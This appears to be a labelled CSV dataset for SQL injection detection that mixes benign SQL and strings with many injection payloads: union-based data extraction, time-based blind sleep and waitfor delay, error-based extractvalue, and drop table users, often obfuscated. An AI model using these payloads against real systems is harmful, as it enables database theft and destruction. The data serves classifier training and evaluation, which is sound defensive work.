Query,Label,cluster,stratify_col
"1'unionselect
table_name,null,nullfrominformation_schema.tables/*!*/and1=1--",1,0,1_0
" select * from{users where id=0x0o1.<@.union select (select (select 0x1)),version  (   )   and 0o10041=(select (select (select]0x0b0x295ad5c2d))) && 0o9 or 0x12f7 likeÃ¢Â 0xb32} or& false or false && true or (select 0) or false -- 0b1x<e",1,2,1_2
select   (  case when   (  2751  =  8206  )   then 2751 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,4,1_4
c/ pirucha s/n 4-e,0,0,0_0
chicle,0,8,0_8
-4389'   )    )     )   or   (  1139  =  3499  )  *3499 and    (    (     (  'qoch'  =  'qoch,1,9,1_9
"' union select null, null, null -- #t1skhpo",1,4,1_4
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",1,4,1_4
select * from lot  where there not like '[dozen]%',0,7,0_7
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'dqoz' like 'dqoz,1,9,1_9
select * from board where    not arrow = 'mind',0,5,0_5
"1'  or   `(  select 'kgjk' where 0b101xf5a   like   0xdca and/(select (select (select (select (select (select (select (select 0550))))))))  like ? +(  select%count  ( /**/*  )   from domain.domains	as t0,domain.columns as t2,domain.tables as[t3  )  or ""	 "" like ""	f"" or ""9i"" not like ""9i"" --",1,4,1_4
n89m3nd2,0,8,0_8
magrath,0,8,0_8
ban_quera,0,8,0_8
0o1')) Ã¢Â where0b1101201110010=7026,1,2,1_2
select top 3 * from thought select * from sense 3select * from forgotten,0,5,0_5
select * from  ( select gasoline from busy ) ,0,7,0_7
"%u0027		and		1	=	convert(int,@@version)--",1,0,1_0
"0b1%'. )  +and 0b0o18114 <=  dbms_utility.sqlid_to_sqlhash   (    (   chr  ((\(select (select (select (select (select (select (select 0x71)))))))  )    or  chr  (  0x5x3d'])  ||chr: (  0x0o860  )    or? chr  (  (select 0x0b110a)[ )   or chr `(  0xb0
 ) or (  select} /**/(? case when  	(  (select 0xaf6)   like   0x0o0b0x102b6f448ce  )   then 0o1 else;0b0o0 end *)  :from dual  )  ||chr] ( @(select (select (select (select (select (select (select (select (select 113)))))))))  )   or chr  (  (select(select (select (select 0x78))))  )  ||chr% (  (select((select (select 0b1110110)))  )   or chr  (  (select/**/7x7a) 
)/**/ ||chr  (> (select 0b0o4167761)   )    )     ) ? and   (  '%' {=  '",1,4,1_4
"4o1'+
 (  select bldn where (select (select (select 8321))) =$(select (select 8321))}and (select 0o20673) like   (  select count  (. *  ) 	 from generate_series  (  0b1,0x8c4b40   )/*;{qs*/   )   and ""^""Â¬ like ""^p"" --",1,4,1_4
moretti alegre,0,8,0_8
select * from entire where rather between '1996-07-01' and '1996-07-31',0,5,0_5
"1)/**/union select 1,database(),3 -- random_noise--",1,0,1_0
-4518 where 8023  =  8023 or 6872  =  6872--,1,6,1_6
" select * from users where id  =  '1' union select \#,@@version -- 1'",1,5,1_5
"   select strong, planned, massfrom trip where paper  is not null",0,1,0_1
23593437z,0,3,0_3
1 where 8578  =  8578 and 4770  =  4474--,1,6,1_6
"selectlike  (  'abcdefg',upper  (	 hex 
(> randomblob :(+(select (select (select 7x0x0x0x870ec0b0)))/(select (select 2b0x4b0o7o2))   )   }) :`   )    )  
 `and     (    (  !>*(; '%' =] '",1,4,1_4
%u0027%u0020or%u00201  = 1%u0020--%u0020,1,2,1_2
1'+  (  select hrgu where 9587  =  9587,1,6,1_6
select indicate from western union select shelf from accurate order by warm,0,7,0_7
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo,1,9,1_9
select count ( distinct environment )  from metal,0,1,0_1
1%u0020&&%u0020(1=1)1=1 -- random_noise--imeq19,1,6,1_6
"8  )_ |and&char  () (select 0x0o6d)  )    or  char/*|rpjm>>i;hp!*/<( 0o7x0b0x6f< )]     or    char
 (; 5x45 `)  +or char +(: 0x0x5a ')	   like  regexp_substring] (  repeat 
( {right& (  char  ( 0b0x0x6o1120  ) !,(select (select 0x0))  )  ,0o1x0x2aa85f204/**/ )] ,null /+(select (select (select}(select (select (select (select 9)))))))ipk*/n$h>w3
*/) :--",1,4,1_4
 update hay set age = 'speak'where secret = 'cattle',0,5,0_5
"' union select 1,2,3--",1,4,1_4
1   )    )    and 4637  =  1408 and    (    (   6509  =  6509,1,6,1_6
entendimiento,0,8,0_8
" select column_name ( s )  from plain,amount",0,1,0_1
'/**/or/**/'1'<='1#v2g9wk4mh,1,9,1_9
1/**/and/**/1 = 1,1,6,1_6
5r32n7,0,3,0_3
"'/**/union/**/select/**/null,/**/null,/**/null/**//**/or/**/'b'like'b'--/**/",1,9,1_9
" select * from users where id  =  1 or ""  (  _"" or 1  =  1 -- 1",1,6,1_6
"' union select null, null, null --",1,4,1_4
"""%or<0b0o156o4o0o10/*gdpp9x6pk`*/=\(select	0x3x0x6x0b1)--",1,2,1_2
1'  )   as fksm where 9714  =  9714,1,6,1_6
"7'+ <( 	select&syrz where 0x7cf>=!0o0b11111011001101union-all[select	null,null,null/**/ or`?'nnq'=like*'nnqa' or false	-or  (select (select 0b10010110101011))=0x25a9 or false or_false or(false and%(select 2532)=(select (select 2532))#`!2}t?	#",1,4,1_4
"0b0o0o1'; )%  as bagi where 0o3x0b0b110106171161110111113010251 %=  (select (select 0x4b0o1))&, ( ;select   (  case when<  (  3x14e0o0 likeÃ¢Â 0b0b0x154b  )  $then`regexp_substring `(  repeat )(  right  (( char (  0o0o0o0b0x5x6o0b0x0o0o11222c0f5ccand(select (select (select (select (select (select (select 1))))))) or false or '<o'='<ol' and true  or  false  &&  ""]?s"" not  like  ""]?sl""@or false#!) /*i*&mr*/,(select (select (select 0x0o0)))  )  ,(select 0x0x0b0o1dcd6100); )?\,null  )  'else char #(`&0xa8  )   or char  (\ 0o0b0o10b11110100011010004100  )   or char  (  0x0x70  ) { or char  (]((select((select	0x0o112))	 )/**/ 	end  )  !from inf   or   mation_schema.system_users[ )&  and  true	and{'/'/ not like  '/w'&or (select	0x0)  and  ""v""+ not like  ""vk""<and\""k1"" not like ""k19""=and\true or,""n"" not like ""n"" or (select (select (select (select 0b0)))) and (select.(select (select 0x1))) or (select (select (select (select 0x20cc)))) like 0x20cd@and true --ev7	""cwxw;t|mb~",1,0,1_0
-5547' or 9323  =  9323#,1,6,1_6
"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",1,6,1_6
" select column_name ( s )  from operation,private",0,1,0_1
2129,0,3,0_3
select * from stuck where gravity  between 10 and 20,0,5,0_5
weddle@teamspanish.bz,0,0,0_0
"  select forward as heading, film as [train]  from wife",0,7,0_7
select form ( s )  from grown,0,1,0_1
select * from sun  where me not like '[mental]%',0,7,0_7
-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok,1,9,1_9
1'+  (  select gqez where 3704  =  3704,1,6,1_6
"0', }(  select upper: (- xmltype  ( ""chr  (  (select`(select 61))  )  ||chr  (  (select 0x3a)  ) "" or chr
	(  (select 4o161)  )   or chr	 (  (select (select (select (select (select 013)))))  )   or chr  (  (select 0b0x70)  )	 ||chr  (  9o0x68  )  ||chr  (! (select (select (select (select (select (select 113))))))  )||(  select.  (  case when   (  (select 0b0o36133)  +like   (select (select 0x0b1010fe))  ) ; then?(select 0x1) else (select 0x0) end  ) -""from dual  )   orÃ¢Â chr  (	 (select 0x0o7b)  ) !||chr$ (  1xbc  ){  or chr{:(  (select\5x3b0b0b3x10f5e) /*fe|t*/)  ||chr  ({ 6b0o1x84  )   or chr  (  (select (select (select 0o205)))/*8f@or false or	false or (select 3x0)  and  ""v"" not like""v&"" or (select (select 0)) and true or false or false and true and 'd1' not like 'd1$' and true or false#yiu*/ )   or chr@ (  0x0b0o3e   )    )     )   from dual  )  =kealw",1,9,1_9
"0o7%""`andchar^ (  (select (select 0x6d)) ,)  : or  char  ( ;0x0b100f{ )@  or char\ (  0o0o0o0x0b0x0xaccd2  )  or /*akd)>w&l or false or (select (select 1382))=1383  or  false or false#:i!j[*/char  (  0xa  )  	 like\ regexp_substring  (  repeat (^_right  (}[char  (  0x0b10101111015  ) ',0x0x4  ). ,(select (select (select (select (select (select (select (select (select|2001010200)))))))))  )  ,null  )  or-0o0   and! /1x0xa0x51 not like}(select 0b0o0x0o0xae5) or (select (select 0x192e))
not like 0b0b10700007000100411090100110110007181110110 and (select (select (select (select;0x1)))).or (select (select 2015))^not like 0o0b111010011001 --e",1,4,1_4
-4562'  )   or 3038  =  3038,1,6,1_6
"' xor extractvalue(1,concat(0x5c,version()))----prekuusf3ulsdfy",1,0,1_0
1'+  (  select 'rqok' where 5074  =  5074 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',1,9,1_9
3411,0,3,0_3
8/)   or   (  select *	from   ({~select  (? sleep \(^`1x0o3< }) 	 ;)     )  ydpu  )*,1,2,1_2
"select * from clothes where father between ""goose"" and    ""certain""",0,2,0_2
"1))%u0020union%u0020select%u00201,database(),3----c4x8egqhv9nlbrf",1,2,1_2
"insert into weight  ( remain, select, distant )  values  ( 'shut', 'create', 'tribe' )  ",0,0,0_0
"8   )  ~)! , and[(select:(select (select (select+(select 0x116e))))) }like	
	 ( ^select countÃ¢Â  (~ *: )'} from sysusers as	sys0o0o0b0o5,sysusers>as""sys0b0xa,sysusers:as sys3,sysusers as sys4,sysusersÃ¢Â as sys5,sysusers+as sys0b110,sysusers as>sys9b8000, )^ ^and\/*zbozaa+9yi]q;zjlwksx@r+zw*/  (^ 	<(  and true:and (select (select 1)) or/**/0 or (select 0) and 0x8aa<>2219 or false#""0b7b0o0b0b1001101000100100100110101100011111000001111010100011011011000010001111100101111110001111111110011001011100001111010000101011111010111011011001100010111010110/**/  like    0o0b100b10910119050`hlh",1,2,1_2
"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",1,4,1_4
gayol,0,8,0_8
"3  ) ; .)    and 0o0o5x2578  like  dbms_pipe.receive_message  (  chr  (: 0o4o0o0x45 ) like,or chr  (
 (select (select (select 0x0o4f)))/ )   or chr  (  0o5o153 	)    or~ chr  ( or (select (select (select (select 0))))# (select 0x15)  )  ,0o2x0o4  )  or false and true	 or 0x0xa93=(select)(select (select`5x9c0))) or 'z' like 'z/'   and 
 'zbv' like 'zbv' or false or false or false and true?or false --zd3",1,4,1_4
test' or '1'<='1' /*,1,9,1_9
"6""/*4x0o0o0b0o0b107011s^)p1:.$ksun~h)wkf_!a*/ ) ^ as?rnte where((select 0x6o0o3x0b160411f)=0o4x5ed^and	(select$(select+(select 2x4x99a)))Ã¢Â =}  (
	select{count `(  * ?)   from{rdb$fields as t0b0b10,rdb$types as t0x3,rdb$collations as
t6o4,rdb$functions/*:(select (select (select (select (select 3)))))*/ast7x6 +)<. ; or    0o9x106=6x586        or   +]    false       and     ` true~--",1,2,1_2
"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yxpo"" like ""yxpo",1,4,1_4
select * from adjective where price not between 10 and 20,0,7,0_7
1 and   (  1977  =  6852  )  *6852-- clxl,1,6,1_6
" select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",1,4,1_4
taciano,0,8,0_8
"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,4,1_4
65931091g,0,3,0_3
calle torreta 126 9c,0,0,0_0
;		drop		table users;		--,1,0,1_0
"0b0x1o0o9'+?+(	select`'ovti' where0x4xb5d;&=* 0x10f3	and`(select 8x0b9x2x0o3x2d7b0d) like~dbms_pipe.receive_message& ()\chr[&((&0b0o12x4c  ),  !\or ; chr+ (\
(select 0o7x28)  )\\^  or ;:]chr 	(_<0b0x205! )  < \or[!{chr ?(  0x0b101100	<) ,(select;0x9o0o36) \ )/*!0x0(*ekzi*/ . )Ã¢Â /'+'r	",1,2,1_2
"1   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
"0o0b0b111b0o0b0b1511101010'?in_booleanÃ¢Â mode})+`/or`false/**/ ||% 'false#union~all	select(null,null,null,null,null,null,null,null--fm?0b0b0b10010001100010010000000001001101010110010011vk",1,9,1_9
81e9604o6o,0,3,0_3
a8ique0r4r,0,8,0_8
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc",1,4,1_4
fuente el olmo de scar,0,0,0_0
" select * from customers  where country in  ( 'germany', 'france', 'uk' ) ;",0,5,0_5
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  3530  =  3530,1,4,1_4
select count ( those ) from provide,0,1,0_1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",1,4,1_4
"1%""  )   waitfor delay '0:0:5' and   (  ""%""  =  """,1,2,1_2
vicens,0,8,0_8
"0o0o2x0b0b1'  )   where 0b7b0o90077*  like  ""(select 0x9b11001011f) or>(select}(select (select[(select 0x624))))  likeÃ¢Â   <(/*;{. or
false:or/**/false or false or (selectÃ¢Â (select (select](select (select (select 0)))))) + or   false or false and true#)dnewkhh bwmd*/ select count  ([[*  )#Ã¢Â  from|all_users t0x0x5,all_users-t6b10,all_users t3,all_users t0o0o0b100,all_users>t0o5) )  Ã¢Â and$ '3
' notlike '7 l'&and&true? and  ""}j""-not like ""}j8""%or 'gh'='gh.')and true --opeh=",1,9,1_9
99997973e,0,3,0_3
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'foju'  =  'foju,1,9,1_9
288508000000000,0,3,0_3
"  select lionid as id, mouse as own from stomach",0,7,0_7
select count ( money ) from center,0,1,0_1
select avg ( range ) from position select sum ( silver ) ,0,1,0_1
select avg ( anything )  from pleasure  select sum ( noun ) ,0,1,0_1
"   select chapter,anything,which,airplane,main     (  (  orbit join ran on sister.purple =  first.friendly )   inner join heldon orders.so =  process.anyid ) ",0,1,0_1
"c/ leopoldo alas ""clarin"" 4, 6?b",0,0,0_0
46225556h,0,3,0_3
"2o0o0b0b4x0o0o4%' rlike   (  select * from{?	({""select  (  sleep?.( \(select;9x3)  \)  
 ) % *) !sgvo ;)^ &&&'%'}  like{ ~'",1,9,1_9
select * from find where price not between 10 and 20,0,7,0_7
"1'or
if(substring(database(),/*
*/1,1)='a',sleep(5),0)/*
*/--",1,9,1_9
"'1'like'1/*
*/",1,0,1_0
9580,0,3,0_3
"1'  ||  Ã¢Â  ( ?select 'ocmk' from dualwhere+0b0xf79 =/**/0xf29 or (select (select (select (select 6796)))) like  
( ?select (select (select (select (select 6793)))) from pg_sleep? (  3b101  )    )Ã¢Â    )  ||'",1,9,1_9
select * from flower where mail in  ( select source from these ) ,0,7,0_7
"-4596"" union all select 5761#",1,6,1_6
"1)   union   select   1,database(),3--",1,4,1_4
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'leps' like 'leps",1,4,1_4
guinaldo guals,0,8,0_8
select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,1,4,1_4
"1  }) , )   ]or pg_sleep <( `__time__ {)/*ftq]kk/?t\(;*/}and """";io""  not    like     """";iom"">  &&  _(select 0o0o0x0x0x5dc) in ((select 0x7d9),(select 0x2332),0o8b0b1011010111100111001001110011110111100010111311) and 0x1/**/--",1,2,1_2
"0o2b8b4""\ &) [	 ) }*)< and (select 1b0xef0b5) like benchmark   or! false   or/  false or false or false and true#({ 0x8o0o7c7b0b301033,md1o6@[( /0x9x09097ea/*(select (select (select 7x0x3)))*/  ) /**/$^) _/ and [^)(\Ã¢Â % (./*-)/m4n9x7ha	(select (select (select (select (select (select 1))))));hpfk4e[p*/* ;( Ã¢Â ""enfu""  like  ""enfup",1,2,1_2
";select
pg_sleep(5);--
",1,0,1_0
"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--",1,4,1_4
1  )   where 1333  =  1333 order by 1--,1,6,1_6
gaianes,0,8,0_8
"4"" 
)  +as_jtou<where(select*0x1fc1)`=/*=;<c/|_9*/ 0x2151(and?(select=(select 4x1d6d))+=/0b0o1751x0o8x5x2d8x0b710d--",1,4,1_4
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'fbzo' like 'fbzo,1,9,1_9
desmerecer,0,8,0_8
waitfor delay '0:0:5'--#e3wkboilcy5b,1,0,1_0
select * from all where level = 'might' limit 3,0,5,0_5
select avg ( grain )  from label  select sum ( available ) ,0,1,0_1
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",1,1,1_1
"1%u0027%u0020and%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020----ixb035lav2",1,2,1_2
"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,4,1_4
"1)union/*
*/select1,database(),3--#1z6saku85d5/*
*/",1,0,1_0
-8513' union all select 7414--,1,6,1_6
"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
; select pg_sleep(5); ----9pihx6m,1,0,1_0
"1))/**/union/**/select/**/1,database(),3 -- random_noise--",1,0,1_0
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xdce'  =  'xdce",1,9,1_9
;/**/drop/**/table/**/users;/**/----tpyeeb09uuy,1,0,1_0
"2""  ) /**/ as qayu\where (select (select 0x0x1aa6))  like] (select (select (select (select (select 0x17ef)))))@union all select null,null,null && ""fz ?f"" <>_""fz ?fr""  or 	false or 'nsi'<>'nsi'#",1,4,1_4
select string ( s )  from possible select knew ( s ) ,0,1,0_1
"  select blind,walk,exciting from fastened left join orders on heard.sawid =  day.period order by studied.solid",0,1,0_1
"3'
 ~or ? ((>`select'allj'
where?0b9x3x6b1ca0x0x0o3x6>`=~/*tu(jb!*/0x0b1130102010010",1,2,1_2
wei-tsig8,0,0,0_0
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,1,1_1
c/ linajes 178 9?f,0,0,0_0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,4,1_4
"4' and   (  select (select (select (select 0x0x0b10)))*  (  if   (  :^(   select * from   (  select concat  (  6x7171706a72,  (  select
  (  elt- (; 0x5b110110016100 \  (like  _  2xd9c,0x0x1 /**(select (select (select (select (select (select 07))))))*/~)    )     )  ,0x717a4x2ffa71,0o0x78   ){  ) 
 s  ) +, (select 0x7138dcfb7617fffa), (select 0x7538dcfb761c93da)   )    )/    ) ;  &&  'wjwn'[`=  'wjwn",1,9,1_9
"0b110x0b0b1100101o0b0b9o0b0x0b1010913'*;)Ã¢Â /*j?h9k*/Ã¢Â union	all""selectÃ¢Â null,null,null,null--",1,2,1_2
2651,0,3,0_3
select avg ( object )  from shot  select sum ( minerals ) ,0,1,0_1
select * from figure where properly between '1996-07-01' and '1996-07-31',0,5,0_5
s353icia41838e,0,8,0_8
dao,0,8,0_8
"1%""  )    )  ,  (  select|!Ã¢Â (  case?when   (~ (select 0b0o2x50eb)   like   (select (select 0x11b3))  ) ` then regexp_substring  (  repeat  (  left }(  crypt_key  (  char  (  0o0o0b0o2o5o0x37 	) ) or char  (  0x0x45  )    or  char  (  (select (select 0o0b0x0o125))? )  ,null| )	 ,0x3  ) 	,0o9519628664  )  ,null \)   else char  (  0o134  )      or    char -(  (select (select 7x46)) ))   or char  (  0x386  )   or char  (  4x47  )   end  )   from   (  values  ( <(select@(select (select (select|(select<(select (select (select (select (select (select (select 0x3))))))))))))   )    )) /*(zr@]tmehmrwyu	*/  )    	&&  $:  (%]  ( .=""%""=""",1,4,1_4
